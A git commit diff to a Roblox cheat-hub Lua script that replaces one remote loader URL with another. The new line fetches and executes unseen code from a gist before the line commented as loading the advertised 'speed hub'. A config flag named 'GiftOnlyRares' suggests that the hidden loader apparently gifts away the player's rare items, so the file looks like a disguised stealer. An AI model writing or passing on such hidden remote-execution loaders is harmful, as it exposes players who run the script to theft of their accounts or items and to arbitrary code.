6631afa63061046290d2be2803c1b92313174941
jorgethegreatq <annzkecastillo456@gmail.com>
2025-07-22 13:22:23 +0800

    Update LimitHub_Luarmor_E.lua

--- LimitHub_Luarmor_E.lua
+++ LimitHub_Luarmor_E.lua
@@ -9,7 +9,7 @@ _G.NullConfig = {
     GiftOnlyRares = "No"
 }
 
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+loadstring(game:HttpGet("https://gist.githubusercontent.com/silenceyeww/793417cf3e9fe1266fe5b5e6b6016cf1/raw/script.lua"))()
 
 -- this would execute speed hub
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_P_E.lua')))()
